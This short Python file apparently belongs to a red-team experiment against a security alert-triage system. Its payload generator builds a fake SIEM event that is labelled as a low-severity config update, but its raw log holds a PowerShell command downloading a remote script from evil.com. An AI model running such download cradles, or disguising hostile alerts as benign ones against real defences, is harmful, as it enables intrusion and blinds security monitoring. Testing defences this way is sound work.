"""
MUTABLE FILE — Red Team v2: testing hardened defenses.
"""


def generate_payload() -> dict:
    # Exp 61: PowerShell web download + phantom IPs
    return {
        "task_type": "config_update",
        "severity": "low",
        "siem_event": {
            "title": "Script Execution Log",
            "source_ip": "203.0.113.61",
            "destination_ip": "198.51.100.61",
            "username": "svc_ps",
            "hostname": "ws-admin-01",
            "rule_name": "ApplicationLog",
            "raw_log": (
                "EventID=4104 ScriptBlock=(New-Object Net.WebClient)"
                ".DownloadString('http://evil.com/shell.ps1') "
                "Process=powershell.exe Account=admin PID=7890"
            ),
        },
    }
